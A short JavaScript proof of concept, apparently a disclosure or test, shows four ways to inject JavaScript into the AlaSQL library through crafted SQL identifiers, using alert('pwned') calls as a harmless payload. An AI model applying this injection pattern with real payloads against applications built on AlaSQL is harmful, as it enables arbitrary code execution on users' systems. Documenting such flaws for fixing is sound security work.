const genPayload = string => `alert(${JSON.stringify(string)})`;

const sql = [
		// Initialize the database
		'CREATE table i_am_a_table;',
    `INSERT INTO i_am_a_table VALUES (1337);`,

    // Code injection in four different ways
    `UPDATE i_am_a_table SET [0'+${genPayload("UPDATE pwned")}+']=42;`,
    `SELECT * from i_am_a_table where whatever=['+${genPayload("SELECT pwned")}+'];`,
    `SELECT \`'+${genPayload("SELECT pwned again, back-quote works too.")}+'\` from i_am_a_table where 1;`,
    `SELECT [whatever||${genPayload('calling function pwned')}||]('whatever');`
];

print(sql)

var res = alasql(sql.join(''));

print(res)
	
